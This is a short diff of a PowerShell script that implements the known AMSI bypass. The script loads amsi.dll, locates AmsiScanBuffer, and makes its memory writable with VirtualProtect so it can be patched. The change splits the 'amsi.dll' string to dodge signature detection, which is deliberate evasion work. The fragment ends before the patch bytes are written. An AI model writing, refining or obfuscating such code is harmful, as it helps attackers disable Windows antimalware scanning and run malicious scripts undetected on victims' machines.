@@ -18,7 +18,7 @@ public class Win32 {
 
 Add-Type $Win32
 
-$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
 $Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
 $p = 0
 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
